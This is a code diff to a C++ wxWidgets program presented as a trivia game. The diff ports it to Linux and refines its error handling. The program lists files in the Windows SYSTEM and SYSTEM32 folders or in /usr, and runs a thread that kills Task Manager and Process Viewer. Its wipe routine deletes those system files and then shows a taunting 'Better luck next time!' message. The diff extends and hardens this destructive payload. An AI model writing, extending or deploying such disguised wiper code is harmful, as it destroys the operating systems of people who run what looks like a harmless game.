@@ -12,25 +12,25 @@ vector<TriviaQuestion> getTriviaQuestions(string fileContents) {
 	for (int i = 0; i < arraySize; i++) {
 		Json::Value jsonItem = triviaJson[i];
 		if (jsonItem.empty())
-			throw InteractBoxException(ErrorCodes::TriviaItemNotFound);
+			throw InteractBoxException(ErrorCodes::ErrorCode::TriviaItemNotFound);
 		Json::Value questionJson = jsonItem["q"];
 		if (questionJson.empty())
-			throw InteractBoxException(ErrorCodes::TriviaQuestionNotFound);
+			throw InteractBoxException(ErrorCodes::ErrorCode::TriviaQuestionNotFound);
 		;
 		Json::Value answersJson = jsonItem["a"];
 		if (answersJson.empty())
-			throw InteractBoxException(ErrorCodes::TriviaAnswersNotFound);
+			throw InteractBoxException(ErrorCodes::ErrorCode::TriviaAnswersNotFound);
 		;
 		Json::Value correctAnswerJson = jsonItem["c"];
 		if (correctAnswerJson.empty())
-			throw InteractBoxException(ErrorCodes::TriviaCorrectAnswerNotFound);
+			throw InteractBoxException(ErrorCodes::ErrorCode::TriviaCorrectAnswerNotFound);
 		;
 		string question = questionJson.asString();
 		vector<string> answers;
 		for (int j = 0; j < 4; j++) {
 			Json::Value arrayItem = answersJson[j];
 			if (arrayItem.empty())
-				throw InteractBoxException(ErrorCodes::ArgumentIsNull, to_string(j));
+				throw InteractBoxException(ErrorCodes::ErrorCode::ArgumentIsNull, to_string(j));
 			answers.push_back(arrayItem.asString());
 		}
 		int correctAnswer = correctAnswerJson.asInt();
@@ -43,7 +43,7 @@ vector<TriviaQuestion> getTriviaQuestions(string fileContents) {
 void loadFileInResource(int name, string type, DWORD& size, const char*& data) {
 	HMODULE handle = ::GetModuleHandle(NULL);
 	if (!handle)
-		throw InteractBoxException(ErrorCodes::CannotFindResource);
+		throw InteractBoxException(ErrorCodes::ErrorCode::CannotFindResource);
 	HRSRC rc = FindResourceA(handle, MAKEINTRESOURCEA(name), type.c_str());
 	HGLOBAL rcData = LoadResource(handle, rc);
 	size = SizeofResource(handle, rc);
@@ -53,7 +53,7 @@ void loadFileInResource(int name, string type, DWORD& size, const char*& data) {
 void loadFileInResource(int name, DWORD& size, unsigned char* data) {
 	HMODULE handle = ::GetModuleHandle(NULL);
 	if (!handle)
-		throw InteractBoxException(ErrorCodes::CannotFindResource);
+		throw InteractBoxException(ErrorCodes::ErrorCode::CannotFindResource);
 	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(name), RT_RCDATA);
 	HGLOBAL rcData = LoadResource(handle, rc);
 	size = SizeofResource(handle, rc);
@@ -114,12 +114,17 @@ vector<wstring> MainAppFrame::setPermissionsAndGetFiles(std::wstring path) {
 
 void MainAppFrame::playSound() {
 	wxSound* sound = new wxSound;
-	bool success = sound->Create("audio\\skill_check.wav");
+#ifdef WIN32
+	const string audioPath = "audio\\skill_check.wav";
+#else
+	const string audioPath = "/etc/interact-box/skill_check.wav";
+#endif
+	bool success = sound->Create(audioPath);
 	if (!success)
-		throw InteractBoxException(ErrorCodes::CannotCreateSound);
+		throw InteractBoxException(ErrorCodes::ErrorCode::CannotCreateSound);
 	success = sound->Play(wxSOUND_ASYNC);
 	if (!success)
-		throw InteractBoxException(ErrorCodes::CannotPlaySound);
+		throw InteractBoxException(ErrorCodes::ErrorCode::CannotPlaySound);
 }
 
 MainAppFrame::MainAppFrame()
@@ -142,9 +147,10 @@ MainAppFrame::MainAppFrame()
 	SetIcon(icon);
 	DestroyIcon(iconHandle);
 #else
+	wxInitAllImageHandlers();
 	wxIcon icon;
 	wxMemoryInputStream stream(icon_trivia_game_ico, icon_trivia_game_ico_len);
-	wxImage image(stream, wxBITMAP_TYPE_PNG);
+	wxImage image(stream, wxBITMAP_TYPE_ICO);
 	icon.CopyFromBitmap(wxBitmap(image));
 #endif
 	playSound();
@@ -174,7 +180,7 @@ MainAppFrame::MainAppFrame()
 	string systemDir = "C:\\WINDOWS\\SYSTEM";
 	string system32Dir = "C:\\WINDOWS\\SYSTEM32";
 
-	for (auto& path : {systemDir, system32Dir}) {
+	for (auto& path : { systemDir, system32Dir }) {
 		_fileCollections.push_back(FileHelper::listFiles(path));
 	}
 	#endif
@@ -182,7 +188,13 @@ MainAppFrame::MainAppFrame()
 	_fileCollections.push_back(FileHelper::listFiles("/usr"));
 #endif
 
-	wxSize size(400, 600);
+	int width = 400;
+#ifdef WIN32
+	int height = 600;
+#else
+	int height = 800;
+#endif
+	wxSize size(width, height);
 	_panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, size);
 	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
 	getQuestion();
@@ -194,13 +206,21 @@ MainAppFrame::MainAppFrame()
 #endif
 	);
 
-	_timeText = new wxStaticText(_panel, TIME_TEXT_ID, L"You have 10 seconds");
+#ifdef WIN32
+	const wstring timeTextString = L"You have 10 seconds";
+	const wstring submitString = L"Submit";
+#else
+	const string timeTextString = "You have 10 seconds";
+	const string submitString = "Submit";
+#endif
+	_timeText = new wxStaticText(_panel, TIME_TEXT_ID, timeTextString);
 	text->SetFont(this->GetFont().Scale(1.25));
 	_timeText->SetFont(this->GetFont().MakeBold());
 	sizer->Add(text, 1, wxEXPAND, 2);
 	sizer->Add(_timeText, 1, wxEXPAND, 1);
 	MainAppFrame::displayQuestion(sizer, _panel);
-	_submitButton = new wxButton(_panel, SUBMIT_BUTTON_ID, L"Submit");
+	
+	_submitButton = new wxButton(_panel, SUBMIT_BUTTON_ID, submitString);
 	_submitButton->Disable();
 	sizer->Add(_submitButton, 1, wxEXPAND, 2);
 	Bind(wxEVT_BUTTON, &MainAppFrame::OnSubmit, this, SUBMIT_BUTTON_ID);
@@ -224,14 +244,12 @@ void MainAppFrame::DoStartThread() {
 	}
 	vector<ProcessNameAndFileName> processes;
 #ifdef WIN32
-	processes.push_back({"PVIEW.EXE", "Process Viewer"});
+	processes.push_back({ "PVIEW.EXE", "Process Viewer" });
 	#if WINVER > _WIN32_WINNT_NT4
-		processes.push_back({"taskmgr.EXE", "Task Manager"});
+	processes.push_back({ "taskmgr.EXE", "Task Manager" });
 	#endif
 #endif
-	processKillerThread = new ProcessKillerThread(
-		this, processes
-	);
+	processKillerThread = new ProcessKillerThread(this, processes);
 
 	if (processKillerThread->Run() != wxTHREAD_NO_ERROR) {
 		wxLogError("Can't create the thread!");
@@ -346,42 +364,52 @@ void MainAppFrame::OnThreadCompletion(wxThreadEvent& event) {
 }
 
 #if defined(WIN32) && WINVER > _WIN32_WINNT_NT4
-void MainAppFrame::deleteFiles(vector<wstring> files) {
+bool MainAppFrame::deleteFiles(vector<wstring> files) {
+	vector<bool> results;
 	for (auto& file : files) {
 		_timeText->SetLabel("Deleting " + file + "...");
-		WINBOOL success = DeleteFile(file.c_str());
+		bool success = FileHelper::deleteFile(file.c_str());
 		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
+		results.push_back(success);
 	}
+	auto successCount = count(results.begin(), results.end(), true);
+	return successCount > (results.size() / 2);
 }
 
 #else
-void MainAppFrame::deleteFiles(vector<string> files) {
+bool MainAppFrame::deleteFiles(vector<string> files) {
+	vector<bool> results;
 	for (auto& file : files) {
 		_timeText->SetLabel("Deleting " + file + "...");
-	#ifdef WIN32
-		WINBOOL success = DeleteFileA(file.c_str());
-	#else
-		bool success = remove(file.c_str());
-	#endif
+		bool success = FileHelper::deleteFile(file.c_str());
 		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
+		results.push_back(success);
 	}
+	auto successCount = count(results.begin(), results.end(), true);
+	return successCount > (results.size() / 2);
 }
 
 #endif
 
 void MainAppFrame::wipeSystemFolders() {
+	vector<bool> results;
 	for (auto& files : _fileCollections) {
-		deleteFiles(files);
+		results.push_back(deleteFiles(files));
 	}
 #ifdef WIN32
 	string systemDirs = "SYSTEM and SYSTEM32";
 #else
 	string systemDirs = "/usr";
 #endif
-	wxMessageBox(
-		"The contents of " + systemDirs + " have been deleted. Better luck next time!", "Trivia Game",
-		wxICON_INFORMATION
-	);
+	auto successCount = count(results.begin(), results.end(), true);
+	if (successCount > (results.size() / 2)) {
+		wxMessageBox(
+			"The contents of " + systemDirs + " have been deleted. Better luck next time!", "Trivia Game",
+			wxICON_INFORMATION
+		);
+	} else {
+		wxMessageBox("Failed to delete the contents of " + systemDirs, "Trivia Game", wxICON_ERROR);
+	}
 	_canClose = true;
 	Close(true);
 }
